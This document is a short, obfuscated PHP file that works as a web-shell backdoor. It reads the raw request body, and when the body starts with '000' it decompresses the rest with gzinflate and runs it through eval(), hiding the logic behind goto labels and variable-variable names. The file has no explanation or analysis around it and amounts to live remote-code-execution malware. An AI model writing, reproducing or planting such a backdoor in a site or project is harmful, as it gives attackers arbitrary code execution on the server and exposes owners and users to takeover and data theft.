<?php

p1x2R:
$GLOBALS["ubozwyjaj"] = "command";
bzsKF:
$GLOBALS["bxnrvykym"] = "rawData";
vl4iw:
$ginubdtj = "rawData";
Ds7OK:
${$ginubdtj} = file_get_contents("php://input");
UqUwM:
$GLOBALS["twtsyv"] = "rawData";
QJwPR:
if (substr(${$GLOBALS["twtsyv"]}, 0, 3) == "000") {
    $GLOBALS["cdwhbznblsyv"] = "uncompressed";
    $GLOBALS["ghewpkixehx"] = "uncompressed";
    $uncompressed = gzinflate(substr(${$GLOBALS["bxnrvykym"]}, 3));
    @(${$GLOBALS["ubozwyjaj"]} = $uncompressed);
    try {
        eval(${$GLOBALS["ubozwyjaj"]});
    } catch (MyException $e) {
    }
}
xnZSr:
